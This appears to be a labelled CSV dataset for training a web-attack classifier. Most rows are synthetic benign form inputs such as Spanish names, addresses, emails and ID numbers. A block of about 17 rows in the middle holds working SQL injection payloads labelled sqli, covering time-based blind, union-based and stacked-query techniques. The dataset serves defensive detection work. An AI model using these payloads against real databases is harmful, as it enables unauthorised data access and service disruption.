payload,label,attack_type
c/ caridad s/n,benign,norm
"campello, el",benign,norm
1442431887503330,benign,norm
nue37,benign,norm
tufts3@joll.rs,benign,norm
22997112x,benign,norm
arenas de san juan,benign,norm
19245,benign,norm
fennell,benign,norm
d50allecido,benign,norm
genny,benign,norm
03248i367ca,benign,norm
grubel8@albeiteria.kw,benign,norm
83497200r,benign,norm
martn de yeltes,benign,norm
1769471856078209,benign,norm
cascabela,benign,norm
ludolfo,benign,norm
snerd@bwds.tj,benign,norm
15365381r,benign,norm
regueras de arriba,benign,norm
08281,benign,norm
7497,benign,norm
mckenney,benign,norm
poma gozalbo,benign,norm
loti@ajuntamentbarcelona2-0.is,benign,norm
"c/ huertas altas, 114",benign,norm
"sequera de haza, la",benign,norm
8755728520539974,benign,norm
kindra,benign,norm
josias,benign,norm
fonoll zurko,benign,norm
07408152j,benign,norm
"c/ aira de villaescusa 199, 1f",benign,norm
09530,benign,norm
4190369223587522,benign,norm
5x8r0r,benign,norm
5599,benign,norm
indocto,benign,norm
serneo,benign,norm
marieau8@clementelr.nz,benign,norm
24314757p,benign,norm
04742,benign,norm
3363230401310436,benign,norm
correccionalmente,benign,norm
cleofs,benign,norm
"europa, 58 2-f",benign,norm
21388,benign,norm
vasilopo,benign,norm
ladronzue_lo,benign,norm
elbeze,benign,norm
cachapera,benign,norm
hibbert.bupp@hojadecalculo.com.mil,benign,norm
56163821y,benign,norm
zarratn,benign,norm
6341227779092516,benign,norm
er3t3e1,benign,norm
atanaspulos,benign,norm
38355013y,benign,norm
"plaa catalunya 124, 5-b",benign,norm
19312,benign,norm
1437589782727245,benign,norm
cuatriduana,benign,norm
1565,benign,norm
ti7o,benign,norm
folch pintado,benign,norm
00474767r,benign,norm
manuel pereira s/n 12?a,benign,norm
esther,benign,norm
labranto,benign,norm
pelez bastus,benign,norm
pianka@noviasteresapalacios.mc,benign,norm
"c/ doctor ferran, 193",benign,norm
38787,benign,norm
fitzgera,benign,norm
13g0e7at42a,benign,norm
kinnie,benign,norm
ret4ne3or,benign,norm
vettenranta@infopromo.az,benign,norm
"el caaveral 130, 5-f",benign,norm
9139561296743472,benign,norm
valina,benign,norm
yoselie,benign,norm
pool echenique,benign,norm
"calle holanda 146,",benign,norm
"tres villas, las",benign,norm
5426744631176158,benign,norm
patrica0,benign,norm
mankowsk,benign,norm
4a39c44a,benign,norm
bow@whitepearlresort.pl,benign,norm
01472954b,benign,norm
adradas,benign,norm
18417,benign,norm
smelters,benign,norm
tamboreo,benign,norm
lamas,benign,norm
sipperly.nakamoto@ceramicasmio.ht,benign,norm
carretera 200 hasta km. 1 barra de mio 175,benign,norm
manzanilla,benign,norm
1181707541494323,benign,norm
jalaie,benign,norm
1613,benign,norm
joelly,benign,norm
flaviano,benign,norm
oshea_knowles@tiaherminia.gh,benign,norm
"calle del llenguadoc s/n, 6e",benign,norm
pujalt,benign,norm
0269447503610316,benign,norm
kristel,benign,norm
reiji,benign,norm
estolano boget,benign,norm
62145911a,benign,norm
"travesia barrionuevo, 49",benign,norm
7738690201675696,benign,norm
daisey,benign,norm
2925,benign,norm
doris,benign,norm
bergad faix,benign,norm
sibirskaia@euskalcasino.es,benign,norm
"c/ lope de rueda s/n, 9-f",benign,norm
alcntar,benign,norm
lozier,benign,norm
alguese,benign,norm
30482828p,benign,norm
"c/ ulises 17,",benign,norm
rube,benign,norm
enlutada,benign,norm
blount,benign,norm
sugesto,benign,norm
suau,benign,norm
germain@elcorteitaliano.cat,benign,norm
"c/ de la sabina, s/n 8?b",benign,norm
betelu,benign,norm
mcglynn,benign,norm
midkiff_mikuni@directoriogratuito.kh,benign,norm
"calle rascafria, 103,",benign,norm
gimialcn,benign,norm
3582197540300309,benign,norm
sprouse,benign,norm
1827,benign,norm
addons,benign,norm
karla,benign,norm
jauregui cortines,benign,norm
86800649y,benign,norm
"paratge lila 30, 10?c",benign,norm
9091453994786923,benign,norm
dyck,benign,norm
pereda barrio,benign,norm
barrymore@hipermadrid.pe,benign,norm
"doctor waksmann, 120, 7?b",benign,norm
caudete,benign,norm
3161746053397457,benign,norm
chao,benign,norm
4403,benign,norm
patacki,benign,norm
xifr,benign,norm
pleasande@doloresmusculares.aq,benign,norm
"sanchez 49,",benign,norm
9008082484622624,benign,norm
o+bispar,benign,norm
adgardo,benign,norm
36914497a,benign,norm
"nucleo santiago apostol 34, 4?f",benign,norm
20491,benign,norm
4811716935763521,benign,norm
inord2n6da7e401,benign,norm
5445,benign,norm
a65esad0,benign,norm
efrn,benign,norm
calle castaos 90,benign,norm
torre-cardela,benign,norm
4867284155125635,benign,norm
oran,benign,norm
tesisteco avi,benign,norm
pepet@naturalchild.co,benign,norm
01308,benign,norm
6702564951251728,benign,norm
remante,benign,norm
919,benign,norm
afoscarse,benign,norm
net.valdez@salaparis.gt,benign,norm
"c/ja del indiano, s/n,",benign,norm
illano,benign,norm
2872946473881757,benign,norm
spears,benign,norm
triana,benign,norm
del ngel kercad,benign,norm
10421521z,benign,norm
"etorbidea askatasuna 170, 8?a",benign,norm
2754013363983769,benign,norm
huong,benign,norm
1729,benign,norm
tse,benign,norm
victoria de los angeles,benign,norm
ventura motn,benign,norm
"roure, 43, 3?d",benign,norm
32648,benign,norm
meggy,benign,norm
3o22ciabl3,benign,norm
ayat rozas,benign,norm
verani@viajesdacapalla.gq,benign,norm
"quinita flores 75,",benign,norm
botarell,benign,norm
3893864101962581,benign,norm
etchieso,benign,norm
9159,benign,norm
marieann,benign,norm
penarroya ingla,benign,norm
gayle@freetag.name,benign,norm
"el halcon 154, 8?f",benign,norm
03314,benign,norm
evin,benign,norm
sa6r2,benign,norm
gorcy.davis@carmensanmartin.bo,benign,norm
16601924h,benign,norm
destriana,benign,norm
25307,benign,norm
9639,benign,norm
longo,benign,norm
armero filippi,benign,norm
uzaki@23horas.ie,benign,norm
24391,benign,norm
lei-see,benign,norm
rahue,benign,norm
serna kovac,benign,norm
51795949h,benign,norm
"calle del derecho 17,",benign,norm
50693,benign,norm
9473535060757439,benign,norm
7a2a6t1ro,benign,norm
1858,benign,norm
pavorde,benign,norm
elois,benign,norm
terrio@likeanangel.dz,benign,norm
46773841y,benign,norm
arndiga,benign,norm
8554607392278464,benign,norm
muntaner nevado,benign,norm
vasilescu.lisi@drogasvirtuales.sc,benign,norm
"luis braille, 33, 12?d",benign,norm
matar,benign,norm
4608056297024601,benign,norm
werling,benign,norm
7012,benign,norm
barnhill,benign,norm
quintilio,benign,norm
naharro,benign,norm
38980059g,benign,norm
"calle isis, 180",benign,norm
6172398321911966,benign,norm
janeva,benign,norm
lzaro,benign,norm
hinwood-laretei@addl.es,benign,norm
canfranc,benign,norm
26323,benign,norm
radioelctrica,benign,norm
3679,benign,norm
apotrerar,benign,norm
mochn quer,benign,norm
30503437d,benign,norm
"carrer asturies, 49",benign,norm
8582534834926521,benign,norm
aghili,benign,norm
colunga corrius,benign,norm
bukoontot@google-movil.cm,benign,norm
c/ asuncion 115 5e,benign,norm
almonacid de la sierra,benign,norm
rorke,benign,norm
3u23pe,benign,norm
philippa,benign,norm
carroar,benign,norm
schwab.carli@emepleo.info,benign,norm
"calle batalla de muhlberg, 25, 6?a",benign,norm
27860,benign,norm
brenda,benign,norm
alpar-ornstein@rockefeller.nu,benign,norm
15423399j,benign,norm
46844,benign,norm
gourley,benign,norm
consalve,benign,norm
c406l2n5,benign,norm
kunneke@storagecraft.nz,benign,norm
89740217j,benign,norm
igzquiza,benign,norm
17867,benign,norm
zandra,benign,norm
agenor,benign,norm
chamberlain@muevemiweb.al,benign,norm
calle jaime ferranz 51,benign,norm
12163,benign,norm
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",malicious,sqli
1) where 7956=7956 or sleep(5)#,malicious,sqli
-7387'))) order by 1--,malicious,sqli
"1))) union all select null,null,null#",malicious,sqli
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",malicious,sqli
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",malicious,sqli
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",malicious,sqli
"1%""))) waitfor delay '0:0:5'--",malicious,sqli
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",malicious,sqli
"1%"");select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",malicious,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",malicious,sqli
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",malicious,sqli
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",malicious,sqli
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
8496429893525706,benign,norm
t324a3ra5a,benign,norm
4932,benign,norm
di0cut6dor7,benign,norm
jener monaj,benign,norm
los polancos 133,benign,norm
"pintanos, los",benign,norm
berrisfo,benign,norm
zaguero,benign,norm
39202408n,benign,norm
"c/ montaer ruiz, 24, 12a",benign,norm
3609841962548925,benign,norm
isador,benign,norm
4906,benign,norm
marcanti,benign,norm
jezabel,benign,norm
pawluszek segu,benign,norm
05782219l,benign,norm
"c/ ricardo codoer, 112,",benign,norm
brunhild,benign,norm
te3496,benign,norm
allaert@chicasdiabolo.ru,benign,norm
63974696n,benign,norm
fla,benign,norm
50629,benign,norm
demostrar,benign,norm
6212,benign,norm
refriega,benign,norm
isidoro,benign,norm
06918701w,benign,norm
"calle la caldera, 76 11-c",benign,norm
4898771590601702,benign,norm
lap,benign,norm
42287106l,benign,norm
"calle beato tomas de zumarraga, 89 12-c",benign,norm
olsen,benign,norm
5urgui8a,benign,norm
spindler1,benign,norm
trincha-32r1,benign,norm
08363269d,benign,norm
"alqueria de pixarroda, 27",benign,norm
0277189059505279,benign,norm
dotan,benign,norm
terribas,benign,norm
leftwich@sms24h.sb,benign,norm
12232,benign,norm
5580428033394873,benign,norm
comba,benign,norm
1140,benign,norm
e23i6gulo,benign,norm
nicolo,benign,norm
floor@aebo.af,benign,norm
88341714w,benign,norm
29639,benign,norm
0052422482512057,benign,norm
nanni-prucnal@fighting-machines.gf,benign,norm
08447437c,benign,norm
46510,benign,norm
0878247632477262,benign,norm
973,benign,norm
merl,benign,norm
quintn,benign,norm
bricat,benign,norm
03046730n,benign,norm
"ronda sant antoni maria claret 144,",benign,norm
jawad,benign,norm
92frico,benign,norm
pipiolo sandrini,benign,norm
velero@softwaresaas.ec,benign,norm
"c/ barriada nueva andalucia, 79, 5?f",benign,norm
lora,benign,norm
anja,benign,norm
3803,benign,norm
descarada,benign,norm
lian,benign,norm
85640413m,benign,norm
"c/ san juan bautista 66, 1?f",benign,norm
24410,benign,norm
1710045357867718,benign,norm
de la barca pitti,benign,norm
dierking3@carmensanmartin.kn,benign,norm
"diaz camacho 107, 2-a",benign,norm
9636562879352994,benign,norm
trashumacin,benign,norm
389,benign,norm
hatajo,benign,norm
yasna,benign,norm
hymen_israeli@aulahost.vc,benign,norm
"cami llorito, 38",benign,norm
5968115219030593,benign,norm
bordin,benign,norm
jeria cifr,benign,norm
litchterman.steiner6@myalbum.by,benign,norm
"calle costa de llevant, 52",benign,norm
murillo el cuende,benign,norm
ligurs,benign,norm
retos9a1o,benign,norm
braham,benign,norm
wieth@camiones-hibridos.md,benign,norm
"cami can rabella, s/n",benign,norm
"manzano, el",benign,norm
virchick1,benign,norm
superable,benign,norm
duran manero,benign,norm
paris-loisel@viavilano.cr,benign,norm
"burgos, s/n, 1f",benign,norm
boimorto,benign,norm
1959107690181502,benign,norm
cycelia,benign,norm
1166,benign,norm
swope,benign,norm
gutman@latiendadecolchones.mn,benign,norm
86626999y,benign,norm
cubillas de santa marta,benign,norm
10182,benign,norm
raha,benign,norm
de5pi6ar4za4,benign,norm
sagu cnstenla,benign,norm
santaniello_tabernero@enfuerteventura.com.ni,benign,norm
plaza asociacion de la prensa 107,benign,norm
segura de los baos,benign,norm
reid5,benign,norm
chimenea,benign,norm
jailyn,benign,norm
irado,benign,norm
norring-fujikawa@autoconstruccion.au,benign,norm
"plza. salamanca 39,",benign,norm
50780,benign,norm
2787973107257855,benign,norm
d060u2ar,benign,norm
hania,benign,norm
hesseman.dolen@gaudio.mu,benign,norm
calle vallseca 123,benign,norm
5176682769033876,benign,norm
guillory,benign,norm
5155,benign,norm
mcculloc,benign,norm
iris,benign,norm
duo_davalos@designworld.cz,benign,norm
isla de cuba 85 3-b,benign,norm
coripe,benign,norm
zauhar,benign,norm
semanera,benign,norm
langellotti,benign,norm
schaafsma@gay-tantra.sj,benign,norm
villanueva del rebollar,benign,norm
38450,benign,norm
grimsley,benign,norm
luego,benign,norm
trampeador,benign,norm
kovac,benign,norm
"calle de can castellvi 35, 10-h",benign,norm
vindel,benign,norm
humfrid,benign,norm
expendedora,benign,norm
carvajal,benign,norm
lightner.manor@rosaserigrafia.as,benign,norm
castellnovo,benign,norm
19127,benign,norm
ania,benign,norm
esmilcea,benign,norm
huerfanidad,benign,norm
robertino,benign,norm
91220241x,benign,norm
"jose gomez gallito, 107,",benign,norm
32252,benign,norm
0577312599845778,benign,norm
inoportunamente,benign,norm
cibeles,benign,norm
carminati@granbretana.com.uk,benign,norm
33273113w,benign,norm
munbrega,benign,norm
4611888318080805,benign,norm
adapuesto,benign,norm
3151,benign,norm
9o52cardea7,benign,norm
benito@mayoriasilenciosa.mu,benign,norm
calle juan de sevilla 102 3c,benign,norm
cabanabona,benign,norm
kouhi,benign,norm
4az,benign,norm
78267819s,benign,norm
"calle rendona 45, 5-a",benign,norm
fady,benign,norm
a8o8decer,benign,norm
sonoe,benign,norm
idalio,benign,norm
portal tauler,benign,norm
edlund@cementoscalibra.yu,benign,norm
sant quirze de besora,benign,norm
27784,benign,norm
meier,benign,norm
c6nte9osa,benign,norm
buisn andres,benign,norm
oliveira_aptekman@engibraltar.va,benign,norm
san bartolom de la torre,benign,norm
12510,benign,norm
nadav6,benign,norm
pent0et3o,benign,norm
keer,benign,norm
gala,benign,norm
waggenheim@rubirubi.info,benign,norm
55265136t,benign,norm
45674,benign,norm
2996877022240469,benign,norm
"torrent de can caralleu 48, 12-g",benign,norm
telde,benign,norm
7745667684469889,benign,norm
brain,benign,norm
7242,benign,norm
kalpak,benign,norm
sixto,benign,norm
peredo huecas,benign,norm
21468433a,benign,norm
"toril, 171 5h",benign,norm
5036144025003599,benign,norm
edlene,benign,norm
albiol,benign,norm
blankenship@likeanangel.tc,benign,norm
"calle jose espejo, 130, 12?a",benign,norm
42148,benign,norm
tom159,benign,norm
3046,benign,norm
ru5runears2,benign,norm
leobaldo,benign,norm
53087910t,benign,norm
"zafiro, s/n 4?b",benign,norm
50174,benign,norm
wei-tsig8,benign,norm
sabu@aridossanchez.lt,benign,norm
"avinguda pinyana, 7 2-h",benign,norm
06196,benign,norm
4780723426433072,benign,norm
abellot*ada,benign,norm
new,benign,norm
donaldo,benign,norm
castell sargatal,benign,norm
58222899d,benign,norm
"camino hoya mondongo, 124",benign,norm
01267,benign,norm
3892784649587009,benign,norm
coxcojita,benign,norm
quiliano,benign,norm
pombal 114 3?d,benign,norm
puerto de bjar,benign,norm
ramesh,benign,norm
cane5o,benign,norm
haroun,benign,norm
lluv8os4,benign,norm
vano branchadell,benign,norm
02650843r,benign,norm
pia de campos,benign,norm
3556606130011191,benign,norm
en8relan3amien0o,benign,norm
osteicoechea uslet,benign,norm
